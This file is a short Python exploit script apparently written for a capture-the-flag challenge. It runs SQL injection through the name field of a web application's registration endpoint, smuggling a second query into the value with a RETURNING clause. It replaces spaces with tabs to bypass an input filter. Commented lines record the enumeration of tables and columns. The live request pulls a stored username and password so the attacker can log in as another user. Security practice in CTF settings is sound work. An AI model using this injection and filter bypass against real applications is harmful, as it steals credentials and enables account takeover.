import requests
import secrets
import json
#for i in range(10):
#    #s = requests.Session()
#    #leak = f"SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {i}"
#    # users, classes, assignments, submissions, submission_results
#    #leak = f"SELECT column_name FROM information_schema.columns WHERE table_name='submission_results' LIMIT 1 OFFSET {i}"
#    # id, result, submission_id, message
#    #leak = f"SELECT submission_id from submission_results WHERE result=true LIMIT 1"
#    # 15
#    #leak = f"SELECT user_id from submissions where id=15"
#    # 74
#    #leak = f"SELECT CONCAT(username,':',password) from users where id=74 LIMIT 1 OFFSET {i}"
#    #leak = leak.replace(' ','\t') # bypass no spaces allowed
#    #data = {'name': secrets.token_hex(16)+"','passworddoesntmatter')\tRETURNING\tid,({leak})--\t".format(leak=leak), 'passwd': 'whatever'}
#    #r = s.post('http://ooonline-class.challenges.ooo:5000/user/register', json=data)
#    #print(r.text)
#    #print(r.status_code)

leak = f"SELECT (SELECT (SELECT CONCAT(username,':',password) from users where id=user_id) from submissions where id=submission_id) from submission_results WHERE result=true LIMIT 1"
leak = leak.replace(' ','\t') # bypass no spaces allowed
data = {'name': secrets.token_hex(16)+"','passworddoesntmatter')\tRETURNING\tid,({leak})--\t".format(leak=leak), 'passwd': 'whatever'}

r = requests.post('http://ooonline-class.challenges.ooo:5000/user/register', json=data)

print(r.text)
print(r.status_code)
# then log in as user and get flag from assignment page
